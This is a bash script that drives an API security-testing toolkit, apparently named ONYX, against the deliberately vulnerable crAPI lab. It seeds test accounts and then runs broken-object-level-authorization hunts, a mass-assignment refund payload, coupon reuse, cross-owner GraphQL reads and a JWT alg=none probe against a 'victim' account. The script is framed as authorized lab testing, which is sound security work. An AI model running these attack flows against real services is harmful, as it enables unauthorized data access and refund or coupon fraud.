#!/usr/bin/env bash
# =============================================================================
# onyx_arsenal.sh  (v2) — run ONYX's FULL arsenal against a live, authorized crAPI
# and show its TRUE, COMPLETE power. Every engine is given its best, fair shot so
# nothing here understates the tool.
#
#   ENGINE                what it proves / adds
#   ── crapi_seed         3 principals + vehicles, orders, mechanic reports, posts, coupon
#   ── onyx_recon         GENERAL N-principal hunt over the FULL OpenAPI surface
#   ── hunt_crapi (x2)    crAPI specialist, all ids wired, --confirm, determinism check
#   ── sequences          MULTI-STEP business logic: refund/state-gate + coupon reuse
#                          (this is what confirms the write-side hunt abstains on)
#   ── conductor          one dissection packet: confirmed findings + ranked hypotheses
#   ── breaker (L3)       relation/chain BOLA + state-gate
#   ── alt_paths_deep(L4X) id-linkage + authz-key + refusal-pivot chains
#   ── graphql_surface    cross-owner GraphQL node reads (best-effort)
#   ── token_probes       JWT alg=none — informational; confirmed ONLY by Δstate
#
#   ./onyx_arsenal.sh --base-url http://localhost:8888 --mailhog http://localhost:8025
#   optional: --openapi /path/to/openapi-spec/crapi-openapi-spec.json  (else auto-detected)
# =============================================================================
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"; cd "$ROOT"

BASE="http://localhost:8888"; MH="http://localhost:8025"; SPEC=""
while [ $# -gt 0 ]; do case "$1" in
  --base-url) BASE="$2"; shift 2;; --mailhog) MH="$2"; shift 2;;
  --openapi) SPEC="$2"; shift 2;; *) echo "unknown arg: $1"; exit 1;; esac; done

PY="python3"; [ -x "$ROOT/.venv/bin/python" ] && PY="$ROOT/.venv/bin/python"
$PY -c "import requests" 2>/dev/null || { python3 -m venv "$ROOT/.venv" && "$ROOT/.venv/bin/python" -m pip -q install requests; PY="$ROOT/.venv/bin/python"; }

# --- pick the CANONICAL full crAPI OpenAPI spec, not a partial per-service one ---
if [ -z "$SPEC" ]; then
  SPEC="$(find "$HOME" -ipath '*/openapi-spec/*.json' 2>/dev/null | grep -i crapi | head -1)"
  [ -z "$SPEC" ] && SPEC="$(find "$HOME" -iname 'crapi-openapi-spec.json' 2>/dev/null | grep -iv -e chatbot -e /services/ | head -1)"
  [ -z "$SPEC" ] && SPEC="$(find "$HOME" -iname '*openapi*.json' -ipath '*crAPI*' 2>/dev/null | grep -iv chatbot | head -1)"
fi
[ -n "$SPEC" ] && echo "· OpenAPI spec: $SPEC" || echo "· no full spec found — recon/conductor use live discovery"

TS="$(date +%Y%m%d_%H%M%S)"; OUT="$ROOT/onyx_arsenal_$TS"; SEEDDIR="$OUT/seed"
mkdir -p "$OUT" "$SEEDDIR" "$OUT/recon" "$OUT/conductor"
REP="$OUT/FULL_REPORT.md"
log(){ tee -a "$OUT/$1"; }
sec(){ echo; echo "════════════════ $1 ════════════════"; }

sec "1) SEED crAPI (3 principals: vehicles, orders, reports, posts, coupon)"
$PY external_targets/crapi_seed.py --base-url "$BASE" --mailhog "$MH" --principals A,B,C --out "$SEEDDIR" 2>&1 | log seed.log
[ -f "$SEEDDIR/seed.json" ] || { echo "✗ seeding failed — see $OUT/seed.log"; exit 1; }

eval "$($PY - "$SEEDDIR/seed.json" <<'PYEOF'
import json,sys
s=json.load(open(sys.argv[1])); acc=s["accounts"]; ids=s["ids"]; pr=s["principals"]
def g(p,k): return ",".join(str(x) for x in (ids.get(p,{}).get(k) or []))
prin=" ".join(f"--principal {p}:{acc[p]['token']}" for p in pr if acc[p].get('token'))
print(f'PRIN="{prin}"')
print(f'ATOK="{acc[pr[0]]["token"]}"')
print(f'AE="{acc["A"]["email"]}" AP="{acc["A"]["password"]}"')
print(f'BE="{acc["B"]["email"]}" BP="{acc["B"]["password"]}"')
print(f'AO="{g("A","orders")}" BO="{g("B","orders")}" AR="{g("A","reports")}" BR="{g("B","reports")}"')
print(f'BSUB="{acc["B"]["email"]}"')
bveh=(ids.get("B",{}).get("vehicles") or [""])[0]; aveh=(ids.get("A",{}).get("vehicles") or [""])[0]
print(f'BVEH="{bveh}" AVEH="{aveh}"')
PYEOF
)"
AO1="${AO%%,*}"; SPECARG=""; [ -n "$SPEC" ] && SPECARG="--openapi $SPEC"
echo "· principals wired (tokens hidden); A.order=$AO1 A.reports=$AR"

sec "2) onyx_recon — GENERAL hunt over the whole surface"
$PY external_targets/onyx_recon.py --authorized --base-url "$BASE" $SPECARG $PRIN \
    --confirm --researcher me --out "$OUT/recon" 2>&1 | log recon.log || true

sec "3) hunt_crapi — specialist, all ids wired, run 1"
$PY external_targets/hunt_crapi.py --confirm --base-url "$BASE" --mailhog "$MH" \
    --a-email "$AE" --a-pass "$AP" --b-email "$BE" --b-pass "$BP" \
    --a-orders "$AO" --b-orders "$BO" --a-reports "$AR" --b-reports "$BR" \
    --coupon TRAC075 --researcher me --out "$OUT/hunt1" 2>&1 | log hunt1.log || true
sec "3) hunt_crapi — run 2 (determinism)"
$PY external_targets/hunt_crapi.py --confirm --base-url "$BASE" --mailhog "$MH" \
    --a-email "$AE" --a-pass "$AP" --b-email "$BE" --b-pass "$BP" \
    --a-orders "$AO" --b-orders "$BO" --a-reports "$AR" --b-reports "$BR" \
    --coupon TRAC075 --researcher me --out "$OUT/hunt2" 2>&1 | log hunt2.log || true

sec "4) sequences — multi-step business logic (refund/state-gate + coupon reuse)"
cat > "$OUT/flows.json" <<JSON
[
  {"name":"order-refund-mass-assign",
   "setup":[],
   "critical":{"method":"PUT","path":"/workshop/api/shop/orders/{id}",
               "effect":"STATE_GATE","body":{"status":"returned","quantity":150},
               "ids":{"A":["$AO1"]}}},
  {"name":"coupon-reuse",
   "setup":[{"principal":"A","method":"POST","path":"/workshop/api/shop/apply_coupon","body":{"coupon_code":"TRAC075","amount":75}}],
   "critical":{"method":"POST","path":"/workshop/api/shop/apply_coupon",
               "effect":"COUPON","body":{"coupon_code":"TRAC075","amount":75},"ids":{"A":["self"]}}}
]
JSON
$PY external_targets/sequences.py --authorized --base-url "$BASE" $PRIN \
    --flows "$OUT/flows.json" --researcher me 2>&1 | log sequences.log || true

sec "5) conductor — dissection packet (confirmed + ranked hypotheses)"
$PY external_targets/conductor.py --authorized --base-url "$BASE" $SPECARG $PRIN \
    --confirm --researcher me --out "$OUT/conductor/packet" 2>&1 | log conductor.log || true

sec "6) breaker — Layer-3 relation/chain BOLA + state-gate"
$PY external_targets/breaker.py --authorized --base-url "$BASE" $SPECARG $PRIN \
    --confirm --researcher me --out "$OUT/breaker.md" 2>&1 | log breaker.log || true

sec "7) alt_paths_deep — Layer 4-X id-linkage + authz-key + pivot chains"
$PY external_targets/alt_paths_deep.py --authorized --base-url "$BASE" $SPECARG $PRIN \
    --researcher me --out "$OUT/altpaths_deep.md" 2>&1 | log altpaths_deep.log || true

sec "8) graphql_surface — cross-owner GraphQL node reads (best-effort)"
for gp in /community/api/graphql /graphql /community/graphql; do
  echo "-- graphql-path $gp"
  $PY external_targets/graphql_surface.py --authorized --base-url "$BASE" \
      --graphql-path "$gp" $PRIN --researcher me 2>&1 | log graphql.log || true
done

sec "9) token_probes — JWT alg=none (informational; Δstate-gated)"
cat > "$OUT/victim.json" <<JSON
{"sub":"$BSUB","read_path":"/identity/api/v2/vehicle/{id}/location","oid":"$BVEH",
 "own_path":"/identity/api/v2/vehicle/{id}/location","own_oid":"$AVEH"}
JSON
$PY external_targets/token_probes.py --authorized --base-url "$BASE" \
    --attacker-token "$ATOK" --victim "$OUT/victim.json" --probe alg-none \
    --researcher me 2>&1 | log token.log \
    || echo "(alg=none not applicable — crAPI signs its JWTs; ONYX confirms only by Δstate. Correct: no fabricated finding.)" | log token.log

# ------------------------------- combined report -------------------------------
sec "10) BUILD combined report"
{
  echo "# ONYX — full arsenal on crAPI ($TS)"; echo
  echo "OpenAPI spec: ${SPEC:-'(live discovery)'}"; echo
  echo "## Seed (ids provisioned)"; echo '```'
  $PY - "$SEEDDIR/seed.json" <<'PYEOF'
import json,sys
s=json.load(open(sys.argv[1]))
for p in s["principals"]:
    print(p, {k:v for k,v in s["ids"].get(p,{}).items()})
print("coupon_live:", s.get("coupon_live"))
PYEOF
  echo '```'; echo
  echo "## onyx_recon — general engine (FINDINGS, full)"; echo '```'
  cat "$OUT/recon/recon_report.md" 2>/dev/null || echo "(no recon report — see recon.log)"; echo '```'; echo
  echo "## onyx_recon — coverage/performance"; echo '```'
  cat "$OUT/recon/recon_performance.md" 2>/dev/null | head -60 || true; echo '```'; echo
  echo "## hunt_crapi — confirmed findings (full)"; echo '```'
  cat "$OUT/hunt1/crapi_report.md" 2>/dev/null || echo "(none)"; echo '```'; echo
  echo "## hunt_crapi — capability coverage"; echo '```'
  cat "$OUT/hunt1/crapi_performance.md" 2>/dev/null | sed -n '1,80p' || true; echo '```'; echo
  echo "## sequences — business-logic (refund/coupon)"; echo '```'
  cat "$OUT/sequences.log" 2>/dev/null | tail -20 || true; echo '```'; echo
  echo "## conductor — dissection packet"; echo '```'
  cat "$OUT/conductor/packet.md" 2>/dev/null | head -90 || echo "(see conductor.log)"; echo '```'; echo
  echo "## Engine run status (last line each)"
  for l in recon hunt1 hunt2 sequences conductor breaker altpaths_deep graphql token; do
    printf -- "- %s: " "$l"; tail -1 "$OUT/$l.log" 2>/dev/null; done
  echo; echo "## Determinism (hunt run1 vs run2)"
  if diff -q "$OUT/hunt1/crapi_report.md" "$OUT/hunt2/crapi_report.md" >/dev/null 2>&1; then
     echo "- ✅ identical"; else echo "- ⚠ differ (fresh-object ids differ; compare finding COUNT/CLASS)"; fi
} > "$REP"

echo; echo "=================================================="
echo " DONE.  Full report: $REP"
echo " Read the report:  cat \"$REP\""
echo "=================================================="
